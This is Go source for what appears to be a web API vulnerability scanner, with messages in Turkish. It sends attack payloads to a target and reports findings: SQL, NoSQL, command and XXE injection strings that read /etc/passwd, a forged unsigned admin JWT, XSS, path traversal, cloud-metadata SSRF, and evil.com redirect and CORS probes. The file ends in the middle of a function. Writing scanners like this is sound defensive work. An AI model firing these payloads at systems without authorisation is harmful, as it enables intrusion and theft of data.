package tests

import (
	"fmt"
	"strings"

	"api-security-tool/scanner"
)

type Severity string

const (
	Critical Severity = "CRITICAL"
	High     Severity = "HIGH"
	Medium   Severity = "MEDIUM"
	Low      Severity = "LOW"
	Info     Severity = "INFO"
)

type Finding struct {
	TestName    string
	Severity    Severity
	URL         string
	Method      string
	Description string
	Evidence    string
}

type Runner struct {
	client *scanner.Client
}

func New(client *scanner.Client) *Runner {
	return &Runner{client: client}
}

func (r *Runner) RunAll(method, url string, headers map[string]string) []Finding {
	var findings []Finding

	findings = append(findings, r.testAuthBypass(method, url)...)
	findings = append(findings, r.testBOLA(method, url, headers)...)
	findings = append(findings, r.testBFLA(method, url, headers)...)
	findings = append(findings, r.testJWTNoneAlgorithm(method, url, headers)...)
	findings = append(findings, r.testHTTPMethodOverride(url, headers)...)
	findings = append(findings, r.testVerbTampering(url, headers)...)

	findings = append(findings, r.testSQLInjection(method, url)...)
	findings = append(findings, r.testNoSQLInjection(method, url)...)
	findings = append(findings, r.testCommandInjection(method, url)...)
	findings = append(findings, r.testXSS(method, url)...)
	findings = append(findings, r.testPathTraversal(method, url)...)
	findings = append(findings, r.testXXE(method, url, headers)...)
	findings = append(findings, r.testSSRF(method, url)...)
	findings = append(findings, r.testOpenRedirect(method, url)...)

	findings = append(findings, r.testSensitiveDataExposure(method, url, headers)...)
	findings = append(findings, r.testExcessiveDataExposure(method, url, headers)...)
	findings = append(findings, r.testMassAssignment(method, url, headers)...)

	findings = append(findings, r.testSecurityHeaders(method, url, headers)...)
	findings = append(findings, r.testCORSMisconfiguration(method, url)...)
	findings = append(findings, r.testContentTypeConfusion(method, url, headers)...)
	findings = append(findings, r.testParameterPollution(method, url, headers)...)

	findings = append(findings, r.testImproperAssetManagement(url)...)
	findings = append(findings, r.testAPIVersionExposure(url, headers)...)

	findings = append(findings, r.testRateLimitBypass(method, url, headers)...)
	findings = append(findings, r.testBusinessLogicFlaws(method, url, headers)...)

	findings = append(findings, r.testGraphQL(url, headers)...)
	findings = append(findings, r.testLDAPInjection(method, url)...)
	findings = append(findings, r.testCRLFInjection(method, url, headers)...)
	findings = append(findings, r.testRateLimitHeaders(method, url, headers)...)

	return findings
}

func (r *Runner) testAuthBypass(method, url string) []Finding {
	var findings []Finding

	tests := []struct {
		label   string
		headers map[string]string
	}{
		{"Boş Authorization header", map[string]string{"Authorization": ""}},
		{"Authorization header yok", map[string]string{}},
		{"Geçersiz token", map[string]string{"Authorization": "Bearer invalid.token.here"}},
		{"null token", map[string]string{"Authorization": "Bearer null"}},
	}

	for _, t := range tests {
		result := r.client.Do(method, url, t.headers, nil)
		if result.Error != "" {
			continue
		}
		if result.StatusCode == 200 || result.StatusCode == 201 {
			findings = append(findings, Finding{
				TestName:    "Authentication Bypass",
				Severity:    Critical,
				URL:         url,
				Method:      method,
				Description: fmt.Sprintf("Endpoint kimlik doğrulaması olmadan erişilebilir: %s", t.label),
				Evidence:    fmt.Sprintf("Input: %s → HTTP %d döndü", t.label, result.StatusCode),
			})
			break // ilk pozitif yeterli
		}
	}
	return findings
}

func (r *Runner) testBOLA(method, url string, headers map[string]string) []Finding {
	var findings []Finding

	altIDs := []string{"2", "3", "100", "0", "-1", "99999"}
	for _, id := range altIDs {
		testURL := replaceLastID(url, id)
		if testURL == url {
			break // ID bulunamadı, test anlamsız
		}

		result := r.client.Do(method, testURL, headers, nil)
		if result.Error != "" {
			continue
		}

		if result.StatusCode == 200 && result.ResponseSize > 10 {
			findings = append(findings, Finding{
				TestName:    "BOLA / IDOR",
				Severity:    Critical,
				URL:         testURL,
				Method:      method,
				Description: "Farklı bir nesne ID'siyle (BOLA) yetkisiz veri erişimi mümkün görünüyor.",
				Evidence:    fmt.Sprintf("Input: ID=%s → HTTP 200, %d byte response", id, result.ResponseSize),
			})
			break
		}
	}
	return findings
}

func (r *Runner) testBFLA(method, url string, headers map[string]string) []Finding {
	var findings []Finding

	adminPaths := []string{"/admin", "/manage", "/internal", "/superuser", "/root"}
	base := extractBase(url)

	for _, p := range adminPaths {
		testURL := base + p
		result := r.client.Do("GET", testURL, headers, nil)
		if result.Error != "" {
			continue
		}
		if result.StatusCode == 200 || result.StatusCode == 201 {
			findings = append(findings, Finding{
				TestName:    "BFLA (Broken Function Level Authorization)",
				Severity:    Critical,
				URL:         testURL,
				Method:      "GET",
				Description: "Yönetici/yetkili endpoint'e yetkisiz erişim sağlandı.",
				Evidence:    fmt.Sprintf("GET %s → HTTP %d (%d byte)", testURL, result.StatusCode, result.ResponseSize),
			})
		}
	}

	// DELETE metodunu GET yetkili endpoint'lere dene
	if method == "GET" {
		result := r.client.Do("DELETE", url, headers, nil)
		if result.Error == "" && (result.StatusCode == 200 || result.StatusCode == 204) {
			findings = append(findings, Finding{
				TestName:    "BFLA (HTTP Method Privilege Escalation)",
				Severity:    High,
				URL:         url,
				Method:      "DELETE",
				Description: "GET için tanımlı endpoint DELETE metoduyla da başarıyla çalışıyor.",
				Evidence:    fmt.Sprintf("DELETE %s → HTTP %d", url, result.StatusCode),
			})
		}
	}
	return findings
}

func (r *Runner) testJWTNoneAlgorithm(method, url string, headers map[string]string) []Finding {
	var findings []Finding

	// {"alg":"none","typ":"JWT"}.{"sub":"admin","role":"admin"}.
	noneJWT := "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTcwMDAwMDAwMH0."

	testHeaders := copyHeaders(headers)
	testHeaders["Authorization"] = "Bearer " + noneJWT

	result := r.client.Do(method, url, testHeaders, nil)
	if result.Error != "" {
		return findings
	}

	if result.StatusCode == 200 || result.StatusCode == 201 {
		findings = append(findings, Finding{
			TestName:    "JWT None Algorithm Attack",
			Severity:    Critical,
			URL:         url,
			Method:      method,
			Description: "Sunucu, alg:none ile imzasız JWT'yi kabul ediyor. Herhangi biri admin token üretebilir.",
			Evidence:    fmt.Sprintf("alg:none JWT Bearer token → HTTP %d", result.StatusCode),
		})
	}
	return findings
}

func (r *Runner) testHTTPMethodOverride(url string, headers map[string]string) []Finding {
	var findings []Finding

	overrideHeaders := []string{"X-HTTP-Method-Override", "X-Method-Override", "X-HTTP-Method"}
	for _, h := range overrideHeaders {
		testHeaders := copyHeaders(headers)
		testHeaders[h] = "DELETE"

		result := r.client.Do("POST", url, testHeaders, strings.NewReader("{}"))
		if result.Error != "" {
			continue
		}
		if result.StatusCode == 200 || result.StatusCode == 204 {
			findings = append(findings, Finding{
				TestName:    "HTTP Method Override",
				Severity:    High,
				URL:         url,
				Method:      "POST",
				Description: fmt.Sprintf("Sunucu %s header'ı ile method override'ı destekliyor. Firewall/WAF bypassı mümkün.", h),
				Evidence:    fmt.Sprintf("POST + %s: DELETE → HTTP %d", h, result.StatusCode),
			})
		}
	}
	return findings
}

func (r *Runner) testVerbTampering(url string, headers map[string]string) []Finding {
	var findings []Finding

	unexpectedMethods := []string{"HEAD", "OPTIONS", "TRACE", "PATCH", "PUT"}
	for _, m := range unexpectedMethods {
		result := r.client.Do(m, url, headers, nil)
		if result.Error != "" {
			continue
		}

		if m == "TRACE" && result.StatusCode == 200 {
			findings = append(findings, Finding{
				TestName:    "HTTP TRACE Enabled",
				Severity:    Medium,
				URL:         url,
				Method:      "TRACE",
				Description: "Sunucu TRACE metodunu destekliyor. Cross-Site Tracing (XST) saldırısına açık olabilir.",
				Evidence:    fmt.Sprintf("TRACE %s → HTTP %d", url, result.StatusCode),
			})
		}

		if m == "OPTIONS" && result.StatusCode == 200 {
			allow := result.Headers["Allow"]
			if len(allow) > 0 {
				findings = append(findings, Finding{
					TestName:    "HTTP Verb Enumeration",
					Severity:    Low,
					URL:         url,
					Method:      "OPTIONS",
					Description: "OPTIONS isteği desteklenen metodları ifşa ediyor.",
					Evidence:    fmt.Sprintf("Allow: %s", strings.Join(allow, ", ")),
				})
			}
		}
	}
	return findings
}

func (r *Runner) testSQLInjection(method, url string) []Finding {
	var findings []Finding

	payloads := []struct {
		payload  string
		errCheck []string
	}{
		{"' OR '1'='1", []string{"sql", "mysql", "syntax error", "ora-", "pg_query", "sqlite"}},
		{"1; DROP TABLE users--", []string{"sql", "error", "syntax"}},
		{"' UNION SELECT NULL--", []string{"sql", "union", "column"}},
		{"1' AND SLEEP(5)--", []string{}},  // time-based
		{"1; WAITFOR DELAY '0:0:5'--", []string{}}, // MSSQL time-based
		{"' OR 1=1--", []string{"sql", "error"}},
		{"admin'--", []string{"sql", "error", "syntax"}},
		{"' OR 'x'='x", []string{"sql", "error"}},
	}

	for _, p := range payloads {
		testURL := url + "?id=" + p.payload
		result := r.client.Do("GET", testURL, nil, nil)
		if result.Error != "" {
			continue
		}

		lowerBody := strings.ToLower(result.Body)
		for _, errStr := range p.errCheck {
			if strings.Contains(lowerBody, errStr) {
				findings = append(findings, Finding{
					TestName:    "SQL Injection",
					Severity:    Critical,
					URL:         testURL,
					Method:      "GET",
					Description: "Response SQL hata mesajı içeriyor — SQL injection açığı tespit edildi.",
					Evidence:    fmt.Sprintf("Input: ?id=%s → Response içinde '%s' bulundu", p.payload, errStr),
				})
				break
			}
		}

		if result.StatusCode == 500 {
			findings = append(findings, Finding{
				TestName:    "SQL Injection (Server Error)",
				Severity:    High,
				URL:         testURL,
				Method:      "GET",
				Description: "SQL payload HTTP 500 döndürdü — injection noktası olabilir.",
				Evidence:    fmt.Sprintf("Input: ?id=%s → HTTP 500", p.payload),
			})
		}
	}
	return findings
}

func (r *Runner) testNoSQLInjection(method, url string) []Finding {
	var findings []Finding

	// MongoDB operator injection
	payloads := []struct {
		param   string
		payload string
	}{
		{"username[$ne]", "invalid"},
		{"username[$gt]", ""},
		{"password[$ne]", "invalid"},
		{"id[$gt]", "0"},
		{"email[$regex]", ".*"},
	}

	for _, p := range payloads {
		testURL := fmt.Sprintf("%s?%s=%s", url, p.param, p.payload)
		result := r.client.Do("GET", testURL, nil, nil)
		if result.Error != "" {
			continue
		}

		if result.StatusCode == 200 && result.ResponseSize > 50 {
			findings = append(findings, Finding{
				TestName:    "NoSQL Injection",
				Severity:    Critical,
				URL:         testURL,
				Method:      "GET",
				Description: "MongoDB operator parametresi ile erişim sağlandı. NoSQL injection açığı olabilir.",
				Evidence:    fmt.Sprintf("Input: ?%s=%s → HTTP 200, %d byte", p.param, p.payload, result.ResponseSize),
			})
			break
		}
	}

	// JSON body NoSQL injection (POST)
	if method == "POST" {
		jsonPayloads := []string{
			`{"username": {"$ne": null}, "password": {"$ne": null}}`,
			`{"username": {"$gt": ""}, "password": {"$gt": ""}}`,
		}
		for _, jp := range jsonPayloads {
			result := r.client.Do("POST", url, map[string]string{"Content-Type": "application/json"}, strings.NewReader(jp))
			if result.Error != "" {
				continue
			}
			if result.StatusCode == 200 {
				findings = append(findings, Finding{
					TestName:    "NoSQL Injection (JSON Body)",
					Severity:    Critical,
					URL:         url,
					Method:      "POST",
					Description: "JSON body'de MongoDB operator injection başarılı.",
					Evidence:    fmt.Sprintf("Input body: %s → HTTP 200", jp),
				})
				break
			}
		}
	}
	return findings
}

func (r *Runner) testCommandInjection(method, url string) []Finding {
	var findings []Finding

	payloads := []string{
		"; ls -la",
		"| whoami",
		"&& id",
		"`id`",
		"$(id)",
		"; sleep 5",
		"| cat /etc/passwd",
	}

	for _, p := range payloads {
		testURL := url + "?cmd=" + p
		result := r.client.Do("GET", testURL, nil, nil)
		if result.Error != "" {
			continue
		}

		lowerBody := strings.ToLower(result.Body)
		osIndicators := []string{"root:", "uid=", "gid=", "/bin/bash", "www-data", "daemon"}
		for _, ind := range osIndicators {
			if strings.Contains(lowerBody, ind) {
				findings = append(findings, Finding{
					TestName:    "Command Injection",
					Severity:    Critical,
					URL:         testURL,
					Method:      "GET",
					Description: "Response'da OS komutu çıktısı tespit edildi.",
					Evidence:    fmt.Sprintf("Input: ?cmd=%s → Response içinde '%s' bulundu", p, ind),
				})
				return findings
			}
		}

		if result.StatusCode == 500 {
			findings = append(findings, Finding{
				TestName:    "Command Injection (Server Error)",
				Severity:    Medium,
				URL:         testURL,
				Method:      "GET",
				Description: "OS command payload HTTP 500 döndürdü — injection noktası olabilir.",
				Evidence:    fmt.Sprintf("Input: ?cmd=%s → HTTP 500", p),
			})
		}
	}
	return findings
}

func (r *Runner) testXSS(method, url string) []Finding {
	var findings []Finding

	payloads := []string{
		"<script>alert(1)</script>",
		`"><script>alert(1)</script>`,
		`<img src=x onerror=alert(1)>`,
		`javascript:alert(1)`,
		`<svg onload=alert(1)>`,
	}

	for _, p := range payloads {
		testURL := url + "?q=" + p
		result := r.client.Do("GET", testURL, nil, nil)
		if result.Error != "" {
			continue
		}

		if strings.Contains(result.Body, p) {
			findings = append(findings, Finding{
				TestName:    "Reflected XSS",
				Severity:    High,
				URL:         testURL,
				Method:      "GET",
				Description: "XSS payload'ı response'da encode edilmeden yansıtıldı.",
				Evidence:    fmt.Sprintf("Input: %s → Response'da aynen döndü", p),
			})
			break
		}
	}
	return findings
}

func (r *Runner) testPathTraversal(method, url string) []Finding {
	var findings []Finding

	payloads := []string{
		"../../../etc/passwd",
		"..%2F..%2F..%2Fetc%2Fpasswd",
		"....//....//....//etc/passwd",
		"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
		"..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
	}

	for _, p := range payloads {
		testURL := url + "?file=" + p
		result := r.client.Do("GET", testURL, nil, nil)
		if result.Error != "" {
			continue
		}

		indicators := []string{"root:x:", "[fonts]", "localhost", "127.0.0.1", "daemon:"}
		for _, ind := range indicators {
			if strings.Contains(result.Body, ind) {
				findings = append(findings, Finding{
					TestName:    "Path Traversal",
					Severity:    Critical,
					URL:         testURL,
					Method:      "GET",
					Description: "Dizin geçiş saldırısı ile sistem dosyasına erişildi.",
					Evidence:    fmt.Sprintf("Input: ?file=%s → Response içinde '%s' bulundu", p, ind),
				})
				return findings
			}
		}
	}
	return findings
}

func (r *Runner) testXXE(method, url string, headers map[string]string) []Finding {
	var findings []Finding

	xxePayload := `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>`

	testHeaders := copyHeaders(headers)
	testHeaders["Content-Type"] = "application/xml"

	result := r.client.Do("POST", url, testHeaders, strings.NewReader(xxePayload))
	if result.Error != "" {
		return findings
	}

	if strings.Contains(result.Body, "root:") || strings.Contains(result.Body, "daemon:") {
		findings = append(findings, Finding{
			TestName:    "XXE (XML External Entity)",
			Severity:    Critical,
			URL:         url,
			Method:      "POST",
			Description: "XML External Entity injection ile /etc/passwd dosyası okundu.",
			Evidence:    fmt.Sprintf("XXE payload → Response içinde sistem dosyası içeriği döndü (HTTP %d)", result.StatusCode),
		})
		return findings
	}

	if result.StatusCode == 500 || (result.StatusCode != 415 && result.StatusCode != 404) {
		findings = append(findings, Finding{
			TestName:    "XXE (Olası Blind XXE)",
			Severity:    Medium,
			URL:         url,
			Method:      "POST",
			Description: "Sunucu XML içeriğini işliyor ve XXE payload'ına beklenmedik yanıt verdi. Blind XXE olabilir.",
			Evidence:    fmt.Sprintf("XML XXE payload → HTTP %d (%d byte)", result.StatusCode, result.ResponseSize),
		})
	}
	return findings
}

func (r *Runner) testSSRF(method, url string) []Finding {
	var findings []Finding

	ssrfPayloads := []string{
		"http://169.254.169.254/latest/meta-data/",  // AWS metadata
		"http://metadata.google.internal/",           // GCP metadata
		"http://localhost/",
		"http://127.0.0.1/",
		"http://0.0.0.0/",
		"http://[::1]/",
	}

	ssrfParams := []string{"url", "redirect", "fetch", "proxy", "callback", "load", "src", "href"}

	for _, param := range ssrfParams {
		for _, payload := range ssrfPayloads[:2] { // sadece ilk 2'yi dene (cloud metadata)
			testURL := fmt.Sprintf("%s?%s=%s", url, param, payload)
			result := r.client.Do("GET", testURL, nil, nil)
			if result.Error != "" {
				continue
			}

			cloudIndicators := []string{"ami-id", "instance-id", "iam/security-credentials", "computeMetadata"}
			for _, ind := range cloudIndicators {
				if strings.Contains(result.Body, ind) {
					findings = append(findings, Finding{
						TestName:    "SSRF (Cloud Metadata Exposure)",
						Severity:    Critical,
						URL:         testURL,
						Method:      "GET",
						Description: "Sunucu tarafı istek sahtekarlığı ile cloud metadata endpoint'ine erişildi.",
						Evidence:    fmt.Sprintf("?%s=%s → Response içinde '%s' bulundu", param, payload, ind),
					})
					return findings
				}
			}
		}
	}
	return findings
}

func (r *Runner) testOpenRedirect(method, url string) []Finding {
	var findings []Finding

	redirectParams := []string{"redirect", "url", "next", "return", "returnUrl", "goto", "destination", "target"}
	payload := "https://evil.com"

	for _, param := range redirectParams {
		testURL := fmt.Sprintf("%s?%s=%s", url, param, payload)
		result := r.client.Do("GET", testURL, nil, nil)
		if result.Error != "" {
			continue
		}

		location := ""
		if loc, ok := result.Headers["Location"]; ok && len(loc) > 0 {
			location = loc[0]
		}

		if strings.Contains(location, "evil.com") || (result.StatusCode >= 300 && result.StatusCode < 400 && strings.Contains(location, "evil.com")) {
			findings = append(findings, Finding{
				TestName:    "Open Redirect",
				Severity:    Medium,
				URL:         testURL,
				Method:      "GET",
				Description: fmt.Sprintf("'%s' parametresi ile dış bir URL'ye yönlendirme yapılıyor. Phishing saldırısına açık.", param),
				Evidence:    fmt.Sprintf("?%s=https://evil.com → Location: %s (HTTP %d)", param, location, result.StatusCode),
			})
		}
	}
	return findings
}

func (r *Runner) testSensitiveDataExposure(method, url string, headers map[string]string) []Finding {
	var findings []Finding

	result := r.client.Do(method, url, headers, nil)
	if result.Error != "" || result.Body == "" {
		return findings
	}

	patterns := []struct {
		name     string
		pattern  string
		severity Severity
	}{
		{"Password Leak", `"password"`, Critical},
		{"Password Hash Leak", `"password_hash"`, Critical},
		{"Private Key", "BEGIN PRIVATE KEY", Critical},
		{"RSA Private Key", "BEGIN RSA PRIVATE KEY", Critical},
		{"AWS Access Key", "AKIA", Critical},
		{"AWS Secret Key", "aws_secret", Critical},
		{"Credit Card Number", `"card_number"`, Critical},
		{"CVV", `"cvv"`, Critical},
		{"SSN Pattern", `"ssn"`, High},
		{"Secret Key", `"secret"`, High},
		{"API Key", `"api_key"`, High},
		{"Auth Token", `"auth_token"`, High},
		{"Internal IP", "192.168.", Medium},
		{"Internal IP", "10.0.", Medium},
		{"Stack Trace", "at java.", Medium},
		{"Stack Trace", "Traceback (most recent", Medium},
		{"Debug Info", `"debug"`, Low},
		{"Internal Path", "/var/www/", Low},
		{"Internal Path", "C:\\Users\\", Low},
	}

	lowerBody := strings.ToLower(result.Body)
	for _, sp := range patterns {
		if strings.Contains(lowerBody, strings.ToLower(sp.pattern)) {
			findings = append(findings, Finding{
				TestName:    "Sensitive Data Exposure",
				Severity:    sp.severity,
				URL:         url,
				Method:      method,
				Description: fmt.Sprintf("Response'da hassas veri tespit edildi: %s", sp.name),
				Evidence:    fmt.Sprintf("Pattern '%s' response body'de bulundu", sp.pattern),
			})
		}
	}
	return findings
}

func (r *Runner) testExcessiveDataExposure(method, url string, headers map[string]string) []Finding {
	var findings []Finding

	result := r.client.Do(method, url, headers, nil)
	if result.Error != "" || result.Body == "" {
		return findings
	}

	excessiveFields := []struct {
		field    string
		severity Severity
	}{
		{`"is_admin"`, High},
		{`"is_superuser"`, High},
		{`"role"`, Medium},
		{`"permissions"`, Medium},
		{`"internal_id"`, Medium},
		{`"internal_note"`, Medium},
		{`"salary"`, High},
		{`"balance"`, High},
		{`"credit_score"`, High},
		{`"dob"`, Medium},
		{`"birth_date"`, Medium},
		{`"phone"`, Low},
		{`"address"`, Low},
	}

	lowerBody := strings.ToLower(result.Body)
	for _, f := range excessiveFields {
		if strings.Contains(lowerBody, f.field) {
			findings = append(findings, Finding{
				TestName:    "Excessive Data Exposure",
				Severity:    f.severity,
				URL:         url,
				Method:      method,
				Description: fmt.Sprintf("Response, istemcinin ihtiyaç duymadığı hassas '%s' alanını içeriyor.", f.field),
				Evidence:    fmt.Sprintf("Response body içinde '%s' alanı tespit edildi", f.field),
			})
		}
	}
	return findings
}

// POST/PUT body'sine admin yetkisi veren alanlar ekleniyor
func (r *Runner) testMassAssignment(method, url string, headers map[string]string) []Finding {
	var findings []Finding

	if method != "POST" && method != "PUT" && method != "PATCH" {
		return findings
	}

	maliciousPayloads := []struct {
		payload string
		field   string
	}{
		{`{"isAdmin": true, "role": "admin"}`, "isAdmin/role"},
		{`{"is_admin": true}`, "is_admin"},
		{`{"admin": true}`, "admin"},
		{`{"role": "superuser"}`, "role"},
		{`{"price": 0}`, "price"},
		{`{"balance": 999999}`, "balance"},
	}

	testHeaders := copyHeaders(headers)
	testHeaders["Content-Type"] = "application/json"

	for _, mp := range maliciousPayloads {
		result := r.client.Do(method, url, testHeaders, strings.NewReader(mp.payload))
		if result.Error != "" {
			continue
		}

		lowerBody := strings.ToLower(result.Body)
		if result.StatusCode == 200 || result.StatusCode == 201 {
			if strings.Contains(lowerBody, `"isadmin":true`) ||
				strings.Contains(lowerBody, `"is_admin":true`) ||
				strings.Contains(lowerBody, `"admin":true`) ||
				strings.Contains(lowerBody, `"role":"admin"`) ||
				strings.Contains(lowerBody, `"role":"superuser"`) {
				findings = append(findings, Finding{
					TestName:    "Mass Assignment",
					Severity:    Critical,
					URL:         url,
					Method:      method,
					Description: fmt.Sprintf("Sunucu, '%s' alanını body'den alıp işledi. Yetki yükseltme mümkün.", mp.field),
					Evidence:    fmt.Sprintf("Input body: %s → Response admin/role alanını yansıttı (HTTP %d)", mp.payload, result.StatusCode),
				})
			} else if result.StatusCode == 200 {
				findings = append(findings, Finding{
					TestName:    "Mass Assignment (Şüpheli)",
					Severity:    Medium,
					URL:         url,
					Method:      method,
					Description: fmt.Sprintf("Bilinmeyen '%s' alanları içeren body HTTP 200 ile kabul edildi — sunucu bu alanları filtrelemeyebilir.", mp.field),
					Evidence:    fmt.Sprintf("Input body: %s → HTTP %d", mp.payload, result.StatusCode),
				})
			}
		}
	}
	return findings
}

func (r *Runner) testSecurityHeaders(method, url string, headers map[string]string) []Finding {
	var findings []Finding

	result := r.client.Do(method, url, headers, nil)
	if result.Error != "" {
		return findings
	}

	requiredHeaders := []struct {
		header   string
		severity Severity
		desc     string
	}{
		{"Strict-Transport-Security", High, "HSTS eksik — HTTP downgrade saldırısına açık"},
		{"Content-Security-Policy", High, "CSP eksik — XSS saldırılarına karşı koruma yok"},
		{"X-Content-Type-Options", Medium, "X-Content-Type-Options eksik — MIME sniffing saldırısına açık"},
		{"X-Frame-Options", Medium, "X-Frame-Options eksik — Clickjacking saldırısına açık"},
		{"Permissions-Policy", Low, "Permissions-Policy eksik — tarayıcı özellik erişimi kısıtlanmıyor"},
		{"Referrer-Policy", Low, "Referrer-Policy eksik — URL bilgisi üçüncü taraflara sızabilir"},
		{"Cache-Control", Low, "Cache-Control eksik — hassas veriler önbelleğe alınabilir"},
	}

	for _, rh := range requiredHeaders {
		if _, exists := result.Headers[rh.header]; !exists {
			findings = append(findings, Finding{
				TestName:    "Missing Security Header",
				Severity:    rh.severity,
				URL:         url,
				Method:      method,
				Description: rh.desc,
				Evidence:    fmt.Sprintf("HTTP Response'da '%s' header'ı bulunamadı", rh.header),
			})
		}
	}

	dangerousHeaders := map[string]string{
		"Server":        "Sunucu yazılım versiyonu ifşa oldu",
		"X-Powered-By":  "Backend framework/dil bilgisi ifşa oldu",
		"X-AspNet-Version": "ASP.NET versiyonu ifşa oldu",
	}
	for h, desc := range dangerousHeaders {
		if vals, exists := result.Headers[h]; exists && len(vals) > 0 {
			findings = append(findings, Finding{
				TestName:    "Information Disclosure (Header)",
				Severity:    Low,
				URL:         url,
				Method:      method,
				Description: desc,
				Evidence:    fmt.Sprintf("%s: %s", h, vals[0]),
			})
		}
	}
	return findings
}

func (r *Runner) testCORSMisconfiguration(method, url string) []Finding {
	var findings []Finding

	originTests := []struct {
		origin string
		desc   string
	}{
		{"https://evil.com", "tamamen farklı origin"},
		{"null", "null origin (file:// veya sandboxed iframe)"},
		{"https://evil.com.trusted.com", "suffix bypass"},
	}

	for _, ot := range originTests {
		result := r.client.Do(method, url, map[string]string{"Origin": ot.origin}, nil)
		if result.Error != "" {
			continue
		}

		acao := ""
		if vals, ok := result.Headers["Access-Control-Allow-Origin"]; ok && len(vals) > 0 {
			acao = vals[0]
		}
		acac := ""
		if vals, ok := result.Headers["Access-Control-Allow-Credentials"]; ok && len(vals) > 0 {
			acac = vals[0]
		}

		if acao == "*" {
			findings = append(findings, Finding{
				TestName:    "CORS Misconfiguration (Wildcard)",
				Severity:    Medium,
				URL:         url,
				Method:      method,
				Description: "Tüm origin'lere CORS izni veriliyor (wildcard). Credentials ile birleşirse kritik olur.",
				Evidence:    fmt.Sprintf("Origin: %s → Access-Control-Allow-Origin: *", ot.origin),
			})
		} else if acao == ot.origin {
			sev := High
			detail := ""
			if acac == "true" {
				sev = Critical
				detail = " + Access-Control-Allow-Credentials: true (kimlik bilgileri çalınabilir)"
			}
			findings = append(findings, Finding{
				TestName:    "CORS Misconfiguration",
				Severity:    sev,
				URL:         url,
				Method:      method,
				Description: fmt.Sprintf("Güvenilmeyen '%s' (%s) origin'i kabul ediliyor.%s", ot.origin, ot.desc, detail),
				Evidence:    fmt.Sprintf("Origin: %s → ACAO: %s, ACAC: %s", ot.origin, acao, acac),
			})
		}
	}
	return findings
}

func (r *Runner) testContentTypeConfusion(method, url string, headers map[string]string) []Finding {
	var findings []Finding

	if method != "POST" && method != "PUT" && method != "PATCH" {
		return findings
	}

	contentTypes := []struct {
		ct      string
		body    string
		desc    string
	}{
		{"application/xml", "<root><test>value</test></root>", "JSON endpoint'e XML gönderildi"},
		{"text/plain", "param=value&test=1", "JSON endpoint'e plain text gönderildi"},
		{"application/x-www-form-urlencoded", "param=value&admin=true", "JSON endpoint'e form data gönderildi"},
	}

	for _, ct := range contentTypes {
		testHeaders := copyHeaders(headers)
		testHeaders["Content-Type"] = ct.ct

		result := r.client.Do(method, url, testHeaders, strings.NewReader(ct.body))
		if result.Error != "" {
			continue
		}

		if result.StatusCode == 200 || result.StatusCode == 201 {
			findings = append(findings, Finding{
				TestName:    "Content-Type Confusion",
				Severity:    Medium,
				URL:         url,
				Method:      method,
				Description: fmt.Sprintf("Sunucu beklenmedik Content-Type'ı kabul etti: %s. Input validation atlatılabilir.", ct.ct),
				Evidence:    fmt.Sprintf("%s → HTTP %d (%s)", ct.ct, result.StatusCode, ct.desc),
			})
		}
	}
	return findings
}

func (r *Runner) testParameterPollution(method, url string, headers map[string]string) []Finding {
	var findings []Finding

	pollutedURL := url + "?id=1&id=2"
	result := r.client.Do(method, pollutedURL, headers, nil)
	if result.Error != "" {
		return findings
	}

	if result.StatusCode == 200 {
		findings = append(findings, Finding{
			TestName:    "HTTP Parameter Pollution",
			Severity:    Low,
			URL:         pollutedURL,
			Method:      method,
			Description: "Endpoint, tekrarlanan parametre ile çalışıyor. Parametre kirliliği ile validasyon atlatılabilir.",
			Evidence:    fmt.Sprintf("?id=1&id=2 → HTTP %d", result.StatusCode),
		})
	}
	return findings
}

func (r *Runner) testImproperAssetManagement(url string) []Finding {
	var findings []Finding

	base := extractBase(url)
	sensitiveEndpoints := []struct {
		path     string
		severity Severity
		desc     string
	}{
		{"/swagger", High, "Swagger UI dış dünyaya açık"},
		{"/swagger-ui", High, "Swagger UI dış dünyaya açık"},
		{"/swagger-ui.html", High, "Swagger UI dış dünyaya açık"},
		{"/api-docs", High, "API dokümantasyonu herkese açık"},
		{"/openapi.json", High, "OpenAPI spec dosyası açık"},
		{"/swagger.json", High, "Swagger spec dosyası açık"},
		{"/v1/swagger.json", Medium, "API v1 spec dosyası açık"},
		{"/debug", Critical, "Debug endpoint'i açık"},
		{"/actuator", High, "Spring Actuator endpoint'i açık — sistem bilgisi ifşa"},
		{"/actuator/env", Critical, "Spring Actuator /env — environment variables ifşa"},
		{"/actuator/heapdump", Critical, "Spring Actuator heap dump — hafıza dökümü alınabilir"},
		{"/metrics", Medium, "Metrics endpoint'i açık — sistem metrikleri ifşa"},
		{"/health", Low, "Health endpoint'i açık"},
		{"/status", Low, "Status endpoint'i açık"},
		{"/.env", Critical, ".env dosyası web'den erişilebilir — environment variable sızıntısı"},
		{"/config.json", Critical, "Config dosyası açık"},
		{"/phpinfo.php", High, "phpinfo() açık — PHP konfigürasyon bilgisi ifşa"},
		{"/console", High, "Admin console açık"},
		{"/admin/console", Critical, "Admin console açık"},
		{"/graphql", Medium, "GraphQL endpoint mevcut"},
		{"/graphiql", High, "GraphiQL arayüzü herkese açık"},
	}

	for _, ep := range sensitiveEndpoints {
		testURL := base + ep.path
		result := r.client.Do("GET", testURL, nil, nil)
		if result.Error != "" {
			continue
		}

		if result.StatusCode == 200 || result.StatusCode == 403 {
			sev := ep.severity
			statusNote := ""
			if result.StatusCode == 403 {
				sev = Low
				statusNote = " (403 döndü — endpoint var ama erişim kısıtlı)"
			}
			findings = append(findings, Finding{
				TestName:    "Improper Assets Management",
				Severity:    sev,
				URL:         testURL,
				Method:      "GET",
				Description: ep.desc + statusNote,
				Evidence:    fmt.Sprintf("GET %s → HTTP %d (%d byte)", testURL, result.StatusCode, result.ResponseSize),
			})
		}
	}
	return findings
}

func (r *Runner) testAPIVersionExposure(url string, headers map[string]string) []Finding {
	var findings []Finding

	base := extractBase(url)
	versions := []string{"/v1", "/v2", "/v3", "/api/v1", "/api/v2", "/api/v3", "/api/v0", "/v0", "/beta", "/alpha"}

	for _, v := range versions {
		testURL := base + v
		result := r.client.Do("GET", testURL, headers, nil)
		if result.Error != "" {
			continue
		}

		if result.StatusCode == 200 && result.ResponseSize > 20 {
			findings = append(findings, Finding{
				TestName:    "API Version Exposure",
				Severity:    Medium,
